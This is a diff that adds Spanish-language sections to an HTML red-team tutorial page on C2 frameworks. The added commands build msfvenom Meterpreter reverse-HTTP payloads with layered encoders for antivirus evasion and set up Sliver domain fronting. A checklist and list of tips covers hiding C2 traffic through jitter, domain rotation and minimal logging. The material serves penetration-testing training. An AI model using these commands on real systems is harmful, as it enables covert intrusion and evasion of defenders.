@@ -167,9 +167,126 @@ hashdump
 shell</code></pre>
                         </div>
 
+                        <h2 id="evasion-techniques">Técnicas de Evasión</h2>
+                        <h3 id="obfuscation">Obfuscación de Payloads</h3>
+                        <div class="command-block mb-4" x-data="copyCommand">
+                            <button @click="copy("# Obfuscar payload con msfvenom\n# Encoding múltiple\nmsfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe\n\n# Usar encoders adicionales\nmsfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=8080 -e x86/shikata_ga_nai -i 5 -e x86/call4_dword_xor -i 3 -f exe -o payload.exe\n\n# Obfuscar con Veil-Evasion (si está instalado)\nveil-evasion\n# Seleccionar payload y opciones\n\n# PowerShell obfuscado\n# Usar Invoke-Obfuscation o similar\n# Ejemplo: Ofuscar comando PowerShell antes de ejecutar")" class="copy-btn" :class="{ 'copied': copied }">
+                                <svg x-show="!copied" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" x-cloak>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+                                </svg>
+                                <svg x-show="copied" class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" x-cloak>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                                </svg>
+                            </button>
+                            <pre><code># Obfuscar payload con msfvenom
+# Encoding múltiple
+msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=8080 -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
+
+# Usar encoders adicionales
+msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.100 LPORT=8080 -e x86/shikata_ga_nai -i 5 -e x86/call4_dword_xor -i 3 -f exe -o payload.exe
+
+# Obfuscar con Veil-Evasion (si está instalado)
+veil-evasion
+# Seleccionar payload y opciones
+
+# PowerShell obfuscado
+# Usar Invoke-Obfuscation o similar
+# Ejemplo: Ofuscar comando PowerShell antes de ejecutar</code></pre>
+                        </div>
+
+                        <h3 id="domain-fronting">Domain Fronting y HTTPS</h3>
+                        <div class="command-block mb-4" x-data="copyCommand">
+                            <button @click="copy("# Domain Fronting permite ocultar el C2 real\n# Usa un CDN legítimo (CloudFront, Azure, etc.) como front\n# El tráfico real va al C2 detrás del CDN\n\n# Configurar en Sliver:\ngenerate --http https://legitimate-cdn.com --domain-front --os windows\n\n# Configurar en Cobalt Strike:\n# Profile > HTTP Host Header > Set to legitimate domain\n\n# Ventajas:\n# - Tráfico parece ir a dominio legítimo\n# - Más difícil de bloquear\n# - Mejor evasión de DPI\n\n# Consideraciones:\n# - Requiere dominio legítimo\n# - Algunos CDNs han mitigado esto\n# - Puede ser detectado con análisis de tráfico")" class="copy-btn" :class="{ 'copied': copied }">
+                                <svg x-show="!copied" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" x-cloak>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+                                </svg>
+                                <svg x-show="copied" class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" x-cloak>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                                </svg>
+                            </button>
+                            <pre><code># Domain Fronting permite ocultar el C2 real
+# Usa un CDN legítimo (CloudFront, Azure, etc.) como front
+# El tráfico real va al C2 detrás del CDN
+
+# Configurar en Sliver:
+generate --http https://legitimate-cdn.com --domain-front --os windows
+
+# Configurar en Cobalt Strike:
+# Profile > HTTP Host Header > Set to legitimate domain
+
+# Ventajas:
+# - Tráfico parece ir a dominio legítimo
+# - Más difícil de bloquear
+# - Mejor evasión de DPI
+
+# Consideraciones:
+# - Requiere dominio legítimo
+# - Algunos CDNs han mitigado esto
+# - Puede ser detectado con análisis de tráfico</code></pre>
+                        </div>
+
+                        <h2 id="best-practices">Mejores Prácticas</h2>
+                        <ul>
+                            <li><strong>Usar HTTPS:</strong> Siempre usar cifrado para comunicaciones C2</li>
+                            <li><strong>Rotar dominios:</strong> Cambiar dominios C2 regularmente</li>
+                            <li><strong>Jitter y Sleep:</strong> Configurar tiempos aleatorios entre beacons</li>
+                            <li><strong>User-Agents legítimos:</strong> Usar user-agents de navegadores reales</li>
+                            <li><strong>Certificados válidos:</strong> Usar certificados SSL/TLS válidos cuando sea posible</li>
+                            <li><strong>Logging mínimo:</strong> Reducir logging en servidor C2</li>
+                            <li><strong>Redundancia:</strong> Configurar múltiples listeners y dominios</li>
+                        </ul>
+
+                        <h2 id="checklist-c2">Checklist de Configuración C2</h2>
+                        <div class="checklist-container mb-6">
+                            <div class="checklist" data-checklist-id="c2-setup">
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 0)" class="checklist-checkbox">
+                                        <span>Framework C2 instalado y configurado</span>
+                                    </label>
+                                </div>
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 1)" class="checklist-checkbox">
+                                        <span>Listeners configurados (HTTP/HTTPS/DNS)</span>
+                                    </label>
+                                </div>
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 2)" class="checklist-checkbox">
+                                        <span>Payloads generados y probados</span>
+                                    </label>
+                                </div>
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 3)" class="checklist-checkbox">
+                                        <span>Técnicas de evasión implementadas</span>
+                                    </label>
+                                </div>
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 4)" class="checklist-checkbox">
+                                        <span>HTTPS/SSL configurado</span>
+                                    </label>
+                                </div>
+                                <div class="checklist-item">
+                                    <label class="flex items-center gap-2 cursor-pointer">
+                                        <input type="checkbox" onchange="handleChecklistChange('c2-setup', 5)" class="checklist-checkbox">
+                                        <span>Jitter y sleep configurados</span>
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="checklist-progress mt-4">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" data-progress="c2-setup"></div>
+                                </div>
+                                <p class="text-sm text-gray-600 dark:text-gray-400 mt-2">Progreso: <span data-progress-text="c2-setup">0%</span></p>
+                            </div>
+                        </div>
+
                         <div class="alert alert-success mt-8">
                             <p class="font-semibold mb-2">✅ C2 Setup</p>
-                            <p>Los frameworks C2 son esenciales para ejercicios de Red Team realistas. Sliver es moderno y activamente desarrollado. Covenant es .NET-based y muy flexible. Metasploit es el estándar de la industria. Elige según tus necesidades y objetivos del ejercicio.</p>
+                            <p>Los frameworks C2 son esenciales para ejercicios de Red Team realistas. Sliver es moderno y activamente desarrollado. Covenant es .NET-based y muy flexible. Metasploit es el estándar de la industria. Elige según tus necesidades y objetivos del ejercicio. Implementa técnicas de evasión apropiadas y siempre usa HTTPS para comunicaciones C2.</p>
                         </div>
                     </div>
                 </article>
